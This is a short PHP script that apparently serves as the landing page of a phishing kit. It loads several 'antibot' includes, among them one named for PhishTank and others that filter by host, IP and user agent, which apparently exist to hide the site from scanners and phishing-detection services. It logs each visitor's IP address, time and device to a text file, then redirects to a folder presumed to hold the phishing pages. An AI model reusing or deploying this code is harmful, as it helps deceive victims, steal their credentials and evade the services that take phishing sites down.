<?php
include "bots/anti1.php";
include "bots/anti2.php";
include "bots/anti3.php";
include "bots/anti4.php";
include "bots/anti5.php";
include "bots/anti6.php";
include "bots/anti7.php";
include "bots/anti8.php";
include "bots/antibot_host.php";
include "bots/antibot_ip.php";
include "bots/antibot_phishtank.php";
include "bots/antibot_userAgent.php";
include "./NV6588123/config/911.php";
include("./NV6588123/config/Sys.php");
  
	$ip = getenv("REMOTE_ADDR");
	$file = fopen("JN8.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".gmdate ("Y-n-d")." ".gmdate ("H:i:s")."/DEVICE=".$user_os."\n");
header("Location: ./NV6588123/");
?>